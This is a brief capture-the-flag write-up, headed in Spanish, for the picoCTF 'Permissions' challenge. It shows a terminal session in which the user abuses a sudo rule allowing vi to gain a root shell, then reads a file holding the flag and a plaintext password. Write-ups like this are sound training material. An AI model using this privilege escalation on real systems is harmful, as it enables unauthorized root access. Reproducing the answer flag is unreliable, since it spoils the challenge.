## Permissions

### Descripción
Can you read files in the root file?
### Solución

#### Solución 1

```
picoplayer@challenge:~$ cd .. 
picoplayer@challenge:/home$ cd ..
picoplayer@challenge:/$ ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
picoplayer@challenge:/$ cd /root/
-bash: cd: /root/: Permission denied
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi

root@challenge:/# cd /root/ 
root@challenge:~# ls
root@challenge:~# ls
root@challenge:~# cd
root@challenge:~# ls
root@challenge:~# cd ..
root@challenge:/# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
root@challenge:/# cd root/
root@challenge:~# ls
root@challenge:~# cd ..
root@challenge:/# cd challenge/
root@challenge:/challenge# ls
metadata.json
root@challenge:/challenge# cat metadata.json 
{"flag": "picoCTF{uS1ng_v1m_3dit0r_f6ad392b}", "username": "picoplayer", "password": "e3pn6lmvHt"}root@challenge:/challenge# 
```
picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
### Notas adicionales

### Referencias

-